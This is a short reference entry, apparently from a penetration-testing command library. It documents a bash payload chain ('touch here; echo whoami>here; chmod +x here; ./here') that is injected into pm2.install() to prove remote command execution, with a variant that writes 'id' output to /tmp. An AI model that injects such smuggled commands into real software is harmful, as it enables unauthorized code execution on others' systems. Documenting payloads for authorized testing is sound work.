---
id: uuid-touch-payload
data: touch here; echo whoami>here; chmod +x here; ./here>whoamreallyare
tags:
  - payload
  - rce
type: command
output: Files 'here' and 'whoamreallyare' created with appropriate contents
executor: bash
platforms:
  - macOS
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.543Z'
verified: false
validated: true
submitted: true
---
# touch-here-payload

## Command

```bash
touch here; echo whoami>here; chmod +x here; ./here>whoamreallyare
```

## Description

Chained Bash commands injected into pm2.install() to create an executable file running 'whoami' and redirect output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|

## Examples

### Basic Usage

```bash
touch here; echo whoami>here; chmod +x here; ./here>whoamreallyare
```

### Advanced Usage

```bash
touch /tmp/here; echo id>/tmp/here; chmod +x /tmp/here; /tmp/here>/tmp/info
```

## Expected Output

'Here' file created and made executable with 'whoami' content; 'whoamreallyare' receives output like 'bl4de'.

## Related

- [[procedures/Exploit-PM2-API-Command-Injection]]
- [[commands/node-pm2-exploit]]
